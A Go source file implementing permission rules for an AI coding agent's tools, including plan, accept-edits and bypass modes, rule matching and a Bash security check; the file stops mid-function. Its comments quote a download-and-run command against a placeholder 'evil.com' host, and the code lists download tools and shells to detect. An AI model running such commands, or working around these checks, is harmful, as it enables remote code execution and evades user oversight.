package config

import (
	"context"
	"encoding/json"
	"path/filepath"
	"strings"
	"sync"

	"github.com/bmatcuk/doublestar/v4"
)

// PermissionBehavior represents the outcome of a permission check.
type PermissionBehavior string

const (
	BehaviorAllow       PermissionBehavior = "allow"
	BehaviorDeny        PermissionBehavior = "deny"
	BehaviorAsk         PermissionBehavior = "ask"
	BehaviorPassthrough PermissionBehavior = "passthrough"
)

// PermissionMode represents the current permission evaluation mode.
type PermissionMode string

const (
	ModeDefault           PermissionMode = "default"
	ModePlan              PermissionMode = "plan"
	ModeAcceptEdits       PermissionMode = "acceptEdits"
	ModeBypassPermissions PermissionMode = "bypassPermissions"
	ModeDontAsk           PermissionMode = "dontAsk"
)

// PermissionModeInfo contains display metadata for a permission mode.
type PermissionModeInfo struct {
	Mode       PermissionMode
	Title      string // Full display name (e.g. "Accept edits")
	ShortTitle string // Abbreviated name for status bar (e.g. "Accept")
	Symbol     string // Unicode symbol shown in status bar
}

// AllModes is the canonical list of permission modes in cycling order.
var AllModes = []PermissionMode{
	ModeDefault,
	ModeAcceptEdits,
	ModePlan,
	ModeBypassPermissions,
}

// ModeInfoMap maps each mode to its display metadata.
var ModeInfoMap = map[PermissionMode]PermissionModeInfo{
	ModeDefault: {
		Mode:       ModeDefault,
		Title:      "Default",
		ShortTitle: "Default",
		Symbol:     "",
	},
	ModePlan: {
		Mode:       ModePlan,
		Title:      "Plan Mode",
		ShortTitle: "Plan",
		Symbol:     "\u23F8", // ⏸
	},
	ModeAcceptEdits: {
		Mode:       ModeAcceptEdits,
		Title:      "Accept edits",
		ShortTitle: "Accept",
		Symbol:     "\u23F5\u23F5", // ⏵⏵
	},
	ModeBypassPermissions: {
		Mode:       ModeBypassPermissions,
		Title:      "Bypass Permissions",
		ShortTitle: "Bypass",
		Symbol:     "\u23F5\u23F5", // ⏵⏵
	},
	ModeDontAsk: {
		Mode:       ModeDontAsk,
		Title:      "Don't Ask",
		ShortTitle: "DontAsk",
		Symbol:     "\u23F5\u23F5", // ⏵⏵
	},
}

// CycleMode returns the next permission mode in the cycling order.
// The cycle is: default → acceptEdits → plan → [bypassPermissions if available] → default.
// dontAsk always cycles to default.
func CycleMode(current PermissionMode, bypassAvailable bool) PermissionMode {
	switch current {
	case ModeDefault:
		return ModeAcceptEdits
	case ModeAcceptEdits:
		return ModePlan
	case ModePlan:
		if bypassAvailable {
			return ModeBypassPermissions
		}
		return ModeDefault
	case ModeBypassPermissions:
		return ModeDefault
	case ModeDontAsk:
		return ModeDefault
	default:
		return ModeDefault
	}
}

// ValidPermissionMode returns true if the given string is a valid permission mode.
func ValidPermissionMode(s string) bool {
	switch PermissionMode(s) {
	case ModeDefault, ModePlan, ModeAcceptEdits, ModeBypassPermissions, ModeDontAsk:
		return true
	}
	return false
}

// DecisionReasonType describes why a permission decision was made.
type DecisionReasonType string

const (
	ReasonRule  DecisionReasonType = "rule"
	ReasonMode  DecisionReasonType = "mode"
	ReasonOther DecisionReasonType = "other"
)

// DecisionReason explains why a particular permission decision was made.
type DecisionReason struct {
	Type   DecisionReasonType `json:"type"`
	Reason string             `json:"reason,omitempty"`
	Rule   string             `json:"rule,omitempty"` // the rule string that matched
	Mode   PermissionMode     `json:"mode,omitempty"`
}

// PermissionSuggestion is a suggestion for a permission rule the user could add.
type PermissionSuggestion struct {
	Type        string           `json:"type"`        // "addRules"
	Rules       []PermissionRule `json:"rules"`       // rules to add
	Behavior    string           `json:"behavior"`    // "allow", "deny", "ask"
	Destination string           `json:"destination"` // "localSettings", "projectSettings", etc.
}

// PermissionResult is the rich result of a permission check, matching the JS
// implementation's return type from checkPermissions.
type PermissionResult struct {
	Behavior       PermissionBehavior     `json:"behavior"`
	UpdatedInput   json.RawMessage        `json:"updatedInput,omitempty"`
	Message        string                 `json:"message,omitempty"`
	DecisionReason *DecisionReason        `json:"decisionReason,omitempty"`
	Suggestions    []PermissionSuggestion `json:"suggestions,omitempty"`
}

// ToolPermissionContext holds session-level permission state.
// This matches the JS toolPermissionContext structure.
type ToolPermissionContext struct {
	mu                          sync.RWMutex
	Mode                        PermissionMode        `json:"mode"`
	IsBypassAvailable           bool                   `json:"isBypassPermissionsModeAvailable"`
	AlwaysAllowRules            map[string][]string    `json:"alwaysAllowRules"`
	AlwaysDenyRules             map[string][]string    `json:"alwaysDenyRules"`
	AlwaysAskRules              map[string][]string    `json:"alwaysAskRules"`
	AdditionalWorkingDirectories map[string]string     `json:"additionalWorkingDirectories"`
}

// NewToolPermissionContext creates a new context with default values.
func NewToolPermissionContext() *ToolPermissionContext {
	return &ToolPermissionContext{
		Mode:                         ModeDefault,
		IsBypassAvailable:           false,
		AlwaysAllowRules:             make(map[string][]string),
		AlwaysDenyRules:              make(map[string][]string),
		AlwaysAskRules:               make(map[string][]string),
		AdditionalWorkingDirectories: make(map[string]string),
	}
}

// SetMode changes the permission mode.
func (c *ToolPermissionContext) SetMode(mode PermissionMode) {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.Mode = mode
}

// GetMode returns the current permission mode.
func (c *ToolPermissionContext) GetMode() PermissionMode {
	c.mu.RLock()
	defer c.mu.RUnlock()
	return c.Mode
}

// GetIsBypassAvailable returns whether bypass permissions mode can be cycled to.
func (c *ToolPermissionContext) GetIsBypassAvailable() bool {
	c.mu.RLock()
	defer c.mu.RUnlock()
	return c.IsBypassAvailable
}

// SetIsBypassAvailable sets whether bypass permissions mode can be cycled to.
func (c *ToolPermissionContext) SetIsBypassAvailable(available bool) {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.IsBypassAvailable = available
}

// AddRules adds session-level rules for the given behavior and destination.
func (c *ToolPermissionContext) AddRules(behavior string, destination string, ruleStrings []string) {
	c.mu.Lock()
	defer c.mu.Unlock()

	var target map[string][]string
	switch behavior {
	case "allow":
		target = c.AlwaysAllowRules
	case "deny":
		target = c.AlwaysDenyRules
	case "ask":
		target = c.AlwaysAskRules
	default:
		return
	}

	target[destination] = append(target[destination], ruleStrings...)
}

// RemoveRules removes session-level rules.
func (c *ToolPermissionContext) RemoveRules(behavior string, destination string, ruleStrings []string) {
	c.mu.Lock()
	defer c.mu.Unlock()

	var target map[string][]string
	switch behavior {
	case "allow":
		target = c.AlwaysAllowRules
	case "deny":
		target = c.AlwaysDenyRules
	case "ask":
		target = c.AlwaysAskRules
	default:
		return
	}

	existing := target[destination]
	removeSet := make(map[string]bool)
	for _, r := range ruleStrings {
		removeSet[r] = true
	}

	var filtered []string
	for _, r := range existing {
		if !removeSet[r] {
			filtered = append(filtered, r)
		}
	}
	target[destination] = filtered
}

// GetAllRules returns all session-level rules for a given behavior, flattened
// from all destinations.
func (c *ToolPermissionContext) GetAllRules(behavior string) []string {
	c.mu.RLock()
	defer c.mu.RUnlock()

	var target map[string][]string
	switch behavior {
	case "allow":
		target = c.AlwaysAllowRules
	case "deny":
		target = c.AlwaysDenyRules
	case "ask":
		target = c.AlwaysAskRules
	default:
		return nil
	}

	var all []string
	for _, rules := range target {
		all = append(all, rules...)
	}
	return all
}

// PermissionHandler is the interface that permission handlers implement.
// This mirrors tools.PermissionHandler to avoid import cycles.
type PermissionHandler interface {
	RequestPermission(ctx context.Context, toolName string, input json.RawMessage) (bool, error)
}

// RuleBasedPermissionHandler evaluates permission rules from settings and
// session-level context before falling back to a terminal prompt.
// Rules are evaluated in order; the first matching rule determines the action.
type RuleBasedPermissionHandler struct {
	rules      []PermissionRule
	fallback   PermissionHandler
	permCtx    *ToolPermissionContext
}

// NewRuleBasedPermissionHandler creates a handler that checks rules first,
// then falls back to the provided handler for unmatched tool calls.
func NewRuleBasedPermissionHandler(rules []PermissionRule, fallback PermissionHandler) *RuleBasedPermissionHandler {
	return &RuleBasedPermissionHandler{
		rules:   rules,
		fallback: fallback,
		permCtx: NewToolPermissionContext(),
	}
}

// SetPermissionContext sets the session-level permission context.
func (h *RuleBasedPermissionHandler) SetPermissionContext(ctx *ToolPermissionContext) {
	h.permCtx = ctx
}

// GetPermissionContext returns the session-level permission context.
func (h *RuleBasedPermissionHandler) GetPermissionContext() *ToolPermissionContext {
	return h.permCtx
}

// RequestPermission checks rules for a matching allow/deny before prompting.
func (h *RuleBasedPermissionHandler) RequestPermission(
	ctx context.Context, toolName string, input json.RawMessage,
) (bool, error) {
	result := h.CheckPermission(toolName, input)
	switch result.Behavior {
	case BehaviorAllow:
		return true, nil
	case BehaviorDeny:
		return false, nil
	default: // BehaviorAsk or BehaviorPassthrough
		return h.fallback.RequestPermission(ctx, toolName, input)
	}
}

// CheckPermission evaluates permission rules and returns a rich result.
// This is the main entry point for permission checking.
func (h *RuleBasedPermissionHandler) CheckPermission(toolName string, input json.RawMessage) PermissionResult {
	// 1. Check permission mode.
	if h.permCtx != nil {
		mode := h.permCtx.GetMode()
		switch mode {
		case ModeBypassPermissions:
			return PermissionResult{
				Behavior: BehaviorAllow,
				DecisionReason: &DecisionReason{
					Type:   ReasonMode,
					Mode:   ModeBypassPermissions,
					Reason: "Bypass permissions mode is active",
				},
			}
		case ModeDontAsk:
			return PermissionResult{
				Behavior: BehaviorAllow,
				DecisionReason: &DecisionReason{
					Type:   ReasonMode,
					Mode:   ModeDontAsk,
					Reason: "Don't ask mode is active",
				},
			}
		case ModePlan:
			// In plan mode, only read-only tools are allowed automatically.
			if isReadOnlyTool(toolName) {
				return PermissionResult{
					Behavior: BehaviorAllow,
					DecisionReason: &DecisionReason{
						Type:   ReasonMode,
						Mode:   ModePlan,
						Reason: "Read-only tool allowed in plan mode",
					},
				}
			}
			return PermissionResult{
				Behavior: BehaviorDeny,
				Message:  "Only read-only tools are allowed in plan mode",
				DecisionReason: &DecisionReason{
					Type:   ReasonMode,
					Mode:   ModePlan,
					Reason: "Write operations are not allowed in plan mode",
				},
			}
		}
	}

	// 2. Check session-level always-deny rules.
	if h.permCtx != nil {
		denyRules := h.permCtx.GetAllRules("deny")
		if rule := matchSessionRules(denyRules, toolName, input); rule != "" {
			return PermissionResult{
				Behavior: BehaviorDeny,
				Message:  "Permission denied by session rule: " + rule,
				DecisionReason: &DecisionReason{
					Type: ReasonRule,
					Rule: rule,
				},
			}
		}
	}

	// 3. Check session-level always-allow rules.
	if h.permCtx != nil {
		allowRules := h.permCtx.GetAllRules("allow")
		if rule := matchSessionRules(allowRules, toolName, input); rule != "" {
			return PermissionResult{
				Behavior: BehaviorAllow,
				DecisionReason: &DecisionReason{
					Type: ReasonRule,
					Rule: rule,
				},
			}
		}
	}

	// 4. Check settings-based rules (exact match first, then prefix).
	result := h.matchSettingsRules(toolName, input)
	if result.Behavior != BehaviorPassthrough {
		return result
	}

	// 5. Check read-only commands for Bash.
	if toolName == "Bash" {
		if cmd := extractCommandFromInput(input); cmd != "" {
			if isReadOnlyCommand(cmd) {
				return PermissionResult{
					Behavior: BehaviorAllow,
					DecisionReason: &DecisionReason{
						Type:   ReasonOther,
						Reason: "Read-only command is allowed",
					},
				}
			}
		}
	}

	// 6. Check session-level always-ask rules.
	if h.permCtx != nil {
		askRules := h.permCtx.GetAllRules("ask")
		if rule := matchSessionRules(askRules, toolName, input); rule != "" {
			return PermissionResult{
				Behavior: BehaviorAsk,
				Message:  "Permission required by session rule",
				DecisionReason: &DecisionReason{
					Type: ReasonRule,
					Rule: rule,
				},
			}
		}
	}

	// 7. Mode-specific handling.
	if h.permCtx != nil && h.permCtx.GetMode() == ModeAcceptEdits {
		if isEditTool(toolName) {
			return PermissionResult{
				Behavior: BehaviorAllow,
				DecisionReason: &DecisionReason{
					Type:   ReasonMode,
					Mode:   ModeAcceptEdits,
					Reason: "Edit operations allowed in acceptEdits mode",
				},
			}
		}
	}

	// 8. Fallback: generate suggestions and return ask/passthrough.
	suggestions := generateSuggestions(toolName, input)
	return PermissionResult{
		Behavior:    BehaviorAsk,
		Message:     "This operation requires approval",
		Suggestions: suggestions,
		DecisionReason: &DecisionReason{
			Type:   ReasonOther,
			Reason: "This operation requires approval",
		},
	}
}

// matchSettingsRules checks settings-based permission rules.
// It first does exact matching, then prefix matching for Bash commands.
func (h *RuleBasedPermissionHandler) matchSettingsRules(toolName string, input json.RawMessage) PermissionResult {
	// Separate rules by action.
	var denyRules, allowRules, askRules []PermissionRule
	for _, rule := range h.rules {
		if rule.Tool != toolName {
			continue
		}
		switch rule.Action {
		case "deny":
			denyRules = append(denyRules, rule)
		case "allow":
			allowRules = append(allowRules, rule)
		case "ask":
			askRules = append(askRules, rule)
		}
	}

	value := extractMatchValue(toolName, input, "")

	// Exact deny rules take highest priority.
	for _, rule := range denyRules {
		if ruleMatchesValue(rule, toolName, value, input, matchExact) {
			return PermissionResult{
				Behavior: BehaviorDeny,
				Message:  "Permission denied by rule: " + FormatRuleString(rule),
				DecisionReason: &DecisionReason{
					Type: ReasonRule,
					Rule: FormatRuleString(rule),
				},
			}
		}
	}

	// Exact ask rules.
	for _, rule := range askRules {
		if ruleMatchesValue(rule, toolName, value, input, matchExact) {
			return PermissionResult{
				Behavior: BehaviorAsk,
				Message:  "Permission required by rule: " + FormatRuleString(rule),
				DecisionReason: &DecisionReason{
					Type: ReasonRule,
					Rule: FormatRuleString(rule),
				},
			}
		}
	}

	// Exact allow rules.
	for _, rule := range allowRules {
		if ruleMatchesValue(rule, toolName, value, input, matchExact) {
			return PermissionResult{
				Behavior: BehaviorAllow,
				DecisionReason: &DecisionReason{
					Type: ReasonRule,
					Rule: FormatRuleString(rule),
				},
			}
		}
	}

	// For Bash commands, also try prefix matching.
	if toolName == "Bash" {
		// Prefix deny rules.
		for _, rule := range denyRules {
			if ruleMatchesValue(rule, toolName, value, input, matchPrefix) {
				return PermissionResult{
					Behavior: BehaviorDeny,
					Message:  "Permission denied by prefix rule: " + FormatRuleString(rule),
					DecisionReason: &DecisionReason{
						Type: ReasonRule,
						Rule: FormatRuleString(rule),
					},
				}
			}
		}

		// Prefix ask rules.
		for _, rule := range askRules {
			if ruleMatchesValue(rule, toolName, value, input, matchPrefix) {
				return PermissionResult{
					Behavior: BehaviorAsk,
					Message:  "Permission required by prefix rule: " + FormatRuleString(rule),
					DecisionReason: &DecisionReason{
						Type: ReasonRule,
						Rule: FormatRuleString(rule),
					},
				}
			}
		}

		// Prefix allow rules.
		for _, rule := range allowRules {
			if ruleMatchesValue(rule, toolName, value, input, matchPrefix) {
				return PermissionResult{
					Behavior: BehaviorAllow,
					DecisionReason: &DecisionReason{
						Type: ReasonRule,
						Rule: FormatRuleString(rule),
					},
				}
			}
		}
	}

	return PermissionResult{Behavior: BehaviorPassthrough}
}

// matchMode controls whether matching is exact or prefix-based.
type matchMode int

const (
	matchExact  matchMode = iota
	matchPrefix
)

// ruleMatchesValue checks if a single rule matches the given value.
func ruleMatchesValue(rule PermissionRule, toolName string, value string, input json.RawMessage, mode matchMode) bool {
	if rule.Tool != toolName {
		return false
	}

	// No pattern means match all calls to this tool.
	if rule.Pattern == "" {
		return true
	}

	// For domain: prefix rules (WebFetch), always try.
	if strings.HasPrefix(rule.Pattern, "domain:") {
		domain := strings.TrimPrefix(rule.Pattern, "domain:")
		url := extractStringField(input, "url")
		return strings.Contains(url, domain)
	}

	if value == "" {
		return false
	}

	switch mode {
	case matchExact:
		return matchPatternExact(rule.Pattern, value, toolName)
	case matchPrefix:
		return matchPatternPrefix(rule.Pattern, value)
	}
	return false
}

// matchPatternExact performs exact pattern matching.
// For Bash: uses simple wildcard matching (where * matches anything including /).
// For file tools: uses path-based glob matching via doublestar.
func matchPatternExact(pattern, value, toolName string) bool {
	// Handle :* suffix (prefix matching, legacy Bash syntax).
	if strings.HasSuffix(pattern, ":*") {
		prefix := strings.TrimSuffix(pattern, ":*")
		return strings.HasPrefix(value, prefix)
	}

	// For Bash commands, use simple wildcard matching (not path-based).
	// Command strings like "rm -rf /tmp" should match "rm *" even though
	// they contain path separators.
	if toolName == "Bash" {
		if simpleWildcardMatch(pattern, value) {
			return true
		}
		// Also try against the base command (first word).
		parts := strings.Fields(value)
		if len(parts) > 0 {
			if simpleWildcardMatch(pattern, filepath.Base(parts[0])) {
				return true
			}
		}
		return false
	}

	// For file-based tools, use path-based glob matching.
	if matched, err := doublestar.Match(pattern, value); err == nil && matched {
		return true
	}

	// Also try matching against just the basename.
	if isFilePatternTool(toolName) {
		if matched, err := doublestar.Match(pattern, filepath.Base(value)); err == nil && matched {
			return true
		}
	}

	return false
}

// simpleWildcardMatch matches a pattern against a value where * matches
// any sequence of characters (including / and spaces). This is used for
// Bash command matching where path-based glob semantics are wrong.
func simpleWildcardMatch(pattern, value string) bool {
	// No wildcards: exact match.
	if !strings.Contains(pattern, "*") && !strings.Contains(pattern, "?") {
		return pattern == value
	}

	// Convert simple glob pattern to work character by character.
	return wildcardMatch(pattern, value, 0, 0)
}

// wildcardMatch implements recursive wildcard matching.
func wildcardMatch(pattern, value string, pi, vi int) bool {
	for pi < len(pattern) && vi < len(value) {
		switch pattern[pi] {
		case '*':
			// Skip consecutive stars.
			for pi < len(pattern) && pattern[pi] == '*' {
				pi++
			}
			// Star at end matches everything.
			if pi == len(pattern) {
				return true
			}
			// Try matching the rest of the pattern at each position.
			for vi <= len(value) {
				if wildcardMatch(pattern, value, pi, vi) {
					return true
				}
				vi++
			}
			return false
		case '?':
			pi++
			vi++
		default:
			if pattern[pi] != value[vi] {
				return false
			}
			pi++
			vi++
		}
	}

	// Skip trailing stars.
	for pi < len(pattern) && pattern[pi] == '*' {
		pi++
	}

	return pi == len(pattern) && vi == len(value)
}

// matchPatternPrefix performs prefix matching for Bash commands.
// A pattern like "npm" matches "npm install", "npm run test", etc.
func matchPatternPrefix(pattern, value string) bool {
	// Handle :* suffix explicitly.
	if strings.HasSuffix(pattern, ":*") {
		prefix := strings.TrimSuffix(pattern, ":*")
		return strings.HasPrefix(value, prefix)
	}

	// Check if the command starts with the pattern followed by a space or end.
	if value == pattern {
		return true
	}
	if strings.HasPrefix(value, pattern+" ") {
		return true
	}

	// Try simple wildcard matching.
	if simpleWildcardMatch(pattern, value) {
		return true
	}

	return false
}

// matchSessionRules checks session-level rules (stored as formatted strings
// like "Bash(npm:*)") against a tool call.
func matchSessionRules(rules []string, toolName string, input json.RawMessage) string {
	for _, ruleStr := range rules {
		parsed := ParseRuleString(ruleStr)
		if parsed.Tool != toolName {
			continue
		}
		if parsed.Pattern == "" {
			return ruleStr
		}
		value := extractMatchValue(toolName, input, parsed.Pattern)
		if value == "" {
			continue
		}
		// Try both exact and prefix matching.
		if matchPatternExact(parsed.Pattern, value, toolName) {
			return ruleStr
		}
		if toolName == "Bash" && matchPatternPrefix(parsed.Pattern, value) {
			return ruleStr
		}
	}
	return ""
}

// extractMatchValue gets the value from tool input that should be matched
// against the pattern.
func extractMatchValue(toolName string, input json.RawMessage, pattern string) string {
	switch toolName {
	case "Bash":
		return extractStringField(input, "command")
	case "FileRead", "Read":
		return extractStringField(input, "file_path")
	case "FileEdit", "Edit":
		return extractStringField(input, "file_path")
	case "FileWrite", "Write":
		return extractStringField(input, "file_path")
	case "NotebookEdit":
		return extractStringField(input, "notebook_path")
	case "WebFetch":
		return extractStringField(input, "url")
	case "WebSearch":
		return extractStringField(input, "query")
	case "Glob":
		return extractStringField(input, "path")
	case "Grep":
		return extractStringField(input, "path")
	default:
		return ""
	}
}

// extractStringField extracts a string field from JSON input.
func extractStringField(input json.RawMessage, key string) string {
	if input == nil {
		return ""
	}
	var m map[string]json.RawMessage
	if err := json.Unmarshal(input, &m); err != nil {
		return ""
	}
	v, ok := m[key]
	if !ok {
		return ""
	}
	var s string
	if err := json.Unmarshal(v, &s); err != nil {
		return ""
	}
	return s
}

// extractCommandFromInput is a convenience wrapper for extracting bash commands.
func extractCommandFromInput(input json.RawMessage) string {
	return extractStringField(input, "command")
}

// isReadOnlyTool returns true for tools that only read data and don't
// modify the filesystem or make network requests.
func isReadOnlyTool(name string) bool {
	switch name {
	case "FileRead", "Read", "Glob", "Grep", "TodoWrite",
		"AskUserQuestion", "ExitPlanMode", "TaskOutput", "Config":
		return true
	default:
		return false
	}
}

// isEditTool returns true for tools that modify files.
func isEditTool(name string) bool {
	switch name {
	case "FileEdit", "Edit", "FileWrite", "Write", "NotebookEdit":
		return true
	default:
		return false
	}
}

// isFilePatternTool returns true for tools that use file path patterns
// (as opposed to command prefix patterns).
func isFilePatternTool(name string) bool {
	switch name {
	case "Read", "FileRead", "Write", "FileWrite", "Edit", "FileEdit",
		"Glob", "NotebookEdit":
		return true
	default:
		return false
	}
}

// readOnlyCommands are bash commands that only read data.
var readOnlyCommands = map[string]bool{
	"ls": true, "cat": true, "head": true, "tail": true,
	"less": true, "more": true, "wc": true, "file": true,
	"which": true, "whoami": true, "hostname": true,
	"pwd": true, "echo": true, "printf": true, "date": true,
	"uname": true, "env": true, "printenv": true,
	"id": true, "groups": true, "df": true, "du": true,
	"free": true, "uptime": true, "ps": true, "top": true,
	"find": true, "locate": true, "grep": true, "rg": true,
	"ag": true, "ack": true, "diff": true, "stat": true,
	"type": true, "command": true, "hash": true,
	"git": false, // git has both read and write subcommands
}

// readOnlyGitSubcommands lists git subcommands that are read-only.
var readOnlyGitSubcommands = map[string]bool{
	"status": true, "log": true, "diff": true, "show": true,
	"branch": true, "tag": true, "remote": true,
	"describe": true, "ls-files": true, "ls-tree": true,
	"cat-file": true, "rev-parse": true, "rev-list": true,
	"name-rev": true, "shortlog": true, "blame": true,
	"config": true,
}

// isReadOnlyCommand checks if a bash command is read-only (won't modify state).
func isReadOnlyCommand(cmd string) bool {
	cmd = strings.TrimSpace(cmd)
	if cmd == "" {
		return false
	}

	parts := strings.Fields(cmd)
	baseCmd := filepath.Base(parts[0])

	// Check for pipe chains — only analyze the first command.
	// If the first command is read-only, the whole pipeline
	// output goes to the next command, which we can't control.
	if strings.Contains(cmd, "|") {
		// For piped commands, we can't guarantee read-only.
		return false
	}

	// Check for output redirection — that's a write.
	if strings.Contains(cmd, ">") || strings.Contains(cmd, ">>") {
		return false
	}

	if ro, ok := readOnlyCommands[baseCmd]; ok && ro {
		return true
	}

	// Check git subcommands.
	if baseCmd == "git" && len(parts) > 1 {
		return readOnlyGitSubcommands[parts[1]]
	}

	return false
}

// generateSuggestions creates permission rule suggestions for a tool call.
// These are shown to the user when asking for permission and allow them
// to add the rule to their settings.
func generateSuggestions(toolName string, input json.RawMessage) []PermissionSuggestion {
	var suggestions []PermissionSuggestion

	switch toolName {
	case "Bash":
		cmd := extractStringField(input, "command")
		if cmd == "" {
			return nil
		}
		parts := strings.Fields(cmd)
		if len(parts) == 0 {
			return nil
		}

		// Suggest allowing the base command prefix.
		baseCmd := parts[0]
		if len(parts) > 1 {
			// Suggest the full prefix, e.g., "npm run:*"
			suggestions = append(suggestions, PermissionSuggestion{
				Type: "addRules",
				Rules: []PermissionRule{
					{Tool: "Bash", Pattern: baseCmd + ":*"},
				},
				Behavior:    "allow",
				Destination: "localSettings",
			})
		}

		// Also suggest allowing just the base command.
		suggestions = append(suggestions, PermissionSuggestion{
			Type: "addRules",
			Rules: []PermissionRule{
				{Tool: "Bash", Pattern: baseCmd + " *"},
			},
			Behavior:    "allow",
			Destination: "localSettings",
		})

	case "FileWrite", "Write", "FileEdit", "Edit":
		fp := extractStringField(input, "file_path")
		if fp == "" {
			return nil
		}
		// Suggest allowing writes to this file's directory.
		dir := filepath.Dir(fp)
		if dir != "" && dir != "." {
			suggestions = append(suggestions, PermissionSuggestion{
				Type: "addRules",
				Rules: []PermissionRule{
					{Tool: toolName, Pattern: dir + "/**"},
				},
				Behavior:    "allow",
				Destination: "localSettings",
			})
		}

	case "WebFetch":
		url := extractStringField(input, "url")
		if url == "" {
			return nil
		}
		// Extract domain from URL.
		domain := extractDomain(url)
		if domain != "" {
			suggestions = append(suggestions, PermissionSuggestion{
				Type: "addRules",
				Rules: []PermissionRule{
					{Tool: "WebFetch", Pattern: "domain:" + domain},
				},
				Behavior:    "allow",
				Destination: "localSettings",
			})
		}
	}

	return suggestions
}

// extractDomain extracts the domain from a URL.
func extractDomain(url string) string {
	// Simple domain extraction.
	url = strings.TrimPrefix(url, "https://")
	url = strings.TrimPrefix(url, "http://")
	idx := strings.IndexByte(url, '/')
	if idx != -1 {
		url = url[:idx]
	}
	idx = strings.IndexByte(url, ':')
	if idx != -1 {
		url = url[:idx]
	}
	return url
}

// ValidateRuleString validates that a rule string is well-formed.
// Returns an error message if invalid, or empty string if valid.
func ValidateRuleString(s string) string {
	if s == "" {
		return "Rule string cannot be empty"
	}

	parsed := ParseRuleString(s)

	// Tool name must start with uppercase.
	if len(parsed.Tool) > 0 && parsed.Tool[0] >= 'a' && parsed.Tool[0] <= 'z' {
		return "Tool names must start with uppercase"
	}

	if parsed.Tool == "" {
		return "Tool name cannot be empty"
	}

	// Validate tool-specific patterns.
	if parsed.Pattern != "" {
		switch {
		case isFilePatternTool(parsed.Tool):
			// File pattern tools don't support :* syntax.
			if strings.Contains(parsed.Pattern, ":*") {
				return `The ":*" syntax is only for Bash prefix rules. Use glob patterns like "*" or "**" for file matching.`
			}
		case parsed.Tool == "WebSearch":
			if strings.Contains(parsed.Pattern, "*") || strings.Contains(parsed.Pattern, "?") {
				return "WebSearch does not support wildcards"
			}
		case parsed.Tool == "WebFetch":
			if strings.Contains(parsed.Pattern, "://") || strings.HasPrefix(parsed.Pattern, "http") {
				return "WebFetch rules should use domain: prefix. Example: WebFetch(domain:example.com)"
			}
		}
	}

	return ""
}

// BashSecurityCheck performs security analysis on a bash command and returns
// a PermissionResult indicating whether the command is safe.
func BashSecurityCheck(cmd string) PermissionResult {
	// Check for incomplete/fragment commands before trimming,
	// since leading whitespace is itself suspicious.
	if strings.HasPrefix(cmd, "\t") {
		return PermissionResult{
			Behavior: BehaviorAsk,
			Message:  "Command appears to be an incomplete fragment (starts with tab)",
			DecisionReason: &DecisionReason{
				Type:   ReasonOther,
				Reason: "Command appears to be an incomplete fragment (starts with tab)",
			},
		}
	}
	if strings.HasPrefix(cmd, "-") {
		return PermissionResult{
			Behavior: BehaviorAsk,
			Message:  "Command appears to be an incomplete fragment (starts with flags)",
			DecisionReason: &DecisionReason{
				Type:   ReasonOther,
				Reason: "Command appears to be an incomplete fragment (starts with flags)",
			},
		}
	}
	if len(cmd) > 0 {
		first := cmd[0]
		if first == '&' || first == '|' || first == ';' || first == '>' || first == '<' {
			return PermissionResult{
				Behavior: BehaviorAsk,
				Message:  "Command appears to be a continuation line (starts with operator)",
				DecisionReason: &DecisionReason{
					Type:   ReasonOther,
					Reason: "Command appears to be a continuation line (starts with operator)",
				},
			}
		}
	}

	// Now trim and check for empty.
	cmd = strings.TrimSpace(cmd)
	if cmd == "" {
		return PermissionResult{
			Behavior: BehaviorAllow,
			DecisionReason: &DecisionReason{
				Type:   ReasonOther,
				Reason: "Empty command is safe",
			},
		}
	}

	// Check for dangerous patterns.
	lowerCmd := strings.ToLower(cmd)

	// Check for piping download commands to shell interpreters.
	if reason := checkDangerousPipes(lowerCmd); reason != "" {
		return PermissionResult{
			Behavior: BehaviorAsk,
			Message:  reason,
			DecisionReason: &DecisionReason{
				Type:   ReasonOther,
				Reason: reason,
			},
		}
	}

	// Check eval separately.
	if strings.HasPrefix(lowerCmd, "eval ") || strings.Contains(lowerCmd, " eval ") {
		return PermissionResult{
			Behavior: BehaviorAsk,
			Message:  "eval can execute arbitrary code",
			DecisionReason: &DecisionReason{
				Type:   ReasonOther,
				Reason: "eval can execute arbitrary code",
			},
		}
	}

	// Command passed basic checks.
	return PermissionResult{
		Behavior: BehaviorPassthrough,
	}
}

// checkDangerousPipes checks if a command pipes a download tool to a shell interpreter.
// For example: "curl http://evil.com | sh" or "wget url | bash".
func checkDangerousPipes(lowerCmd string) string {
	// Split by pipe.
	segments := strings.Split(lowerCmd, "|")
	if len(segments) < 2 {
		return ""
	}

	downloadCmds := map[string]bool{"curl": true, "wget": true}
	shellCmds := map[string]bool{"sh": true, "bash": true, "zsh": true}

	for i := 0; i < len(segments)-1; i++ {
		// Get the base command of the left segment.
		leftFields := strings.Fields(strings.TrimSpace(segments[i]))
		if len(leftFields) == 0 {
			continue
		}
		leftCmd := filepath.Base(leftFields[0])

		// Get the base command of the right segment.
		rightFields := strings.Fields(strings.TrimSpace(segments[i+1]))
		if len(rightFields) == 0 {
			continue
		}
		rightCmd := filepath.Base(rightFields[0])

		if downloadCmds[leftCmd] && shellCmds[rightCmd] {
			return "Piping " + leftCmd + " to " + rightCmd + " is dangerous"
		}
	}
	return ""
}

// normalizePipes removes whitespace around pipe characters for pattern matching.
// "curl http://evil.com | sh" → "curl http://evil.com|sh"
func normalizePipes(cmd string) string {
	var result strings.Builder
	runes := []rune(cmd)
	for i := 0; i < len(runes); i++ {
		if runes[i] == '|' {
			// Remove trailing spaces before pipe.
			s := result.String()
			s = strings.TrimRight(s, " \t")
			result.Reset()
			result.WriteString(s)
			result.WriteRune('|')
			// Skip leading spaces after pipe.
			for i+1 < len(runes) && (runes[i+1] == ' ' || runes[i+1] == '\t') {
				i++
			}
		} else {
			result.WriteRune(runes[i])
		}
	}
	return result.String()
}

// ruleMatches checks if a single rule matches the given tool call.
// This is the legacy compatibility function used by the old Go format.
func ruleMatches(rule PermissionRule, toolName string, input json.RawMessage) bool {
	if rule.Tool != toolName {
		return false
	}
	if rule.Pattern == "" {
		return true
	}
	value := extractMatchValue(toolName, input, rule.Pattern)
	if value == "" {
		return false
	}
	return matchPattern(rule.Pattern, value)
}

// matchPattern matches a value against a glob-like permission pattern.
// This is the legacy compatibility function.
// Supports:
//   - Simple glob patterns: "npm run *", "*.env"
//   - Prefix patterns: "npm:*" (matches anything starting with "npm")
//   - Domain patterns: "domain:example.com" (for WebFetch)
//   - Path patterns: "./.env", "src/**/*.go"
func matchPattern(pattern, value string) bool {
